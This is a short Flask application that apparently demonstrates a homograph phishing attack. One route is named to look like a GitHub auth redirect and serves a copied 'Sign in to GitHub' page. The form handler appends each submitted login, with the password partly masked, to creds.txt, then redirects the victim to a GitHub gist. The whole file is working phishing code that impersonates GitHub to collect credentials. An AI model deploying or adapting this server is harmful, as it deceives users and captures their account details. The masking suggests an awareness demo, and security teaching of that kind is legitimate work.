import sys
from flask import Flask, render_template, request, redirect


print(sys.getdefaultencoding())

app = Flask(__name__)


@app.route("/homographs")
def homographs():
    return render_template("index.html").encode("utf-16")


@app.route("/auth_redirect=github.com")
def login():
    return render_template("Sign in to GitHub.html")


@app.route("/authorization", methods=["POST"])
def authorization():
    with open("creds.txt", "a") as file:
        file.write(
            request.form["login"]
            + " "
            + request.form["password"][0:3]
            + "****"
            + request.form["password"][-1]
            + "\n"
        )
    return redirect(
        "https://gist.github.com/rootbid/87e0723cc1707188e86b9724aa64059f"
    )


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80)
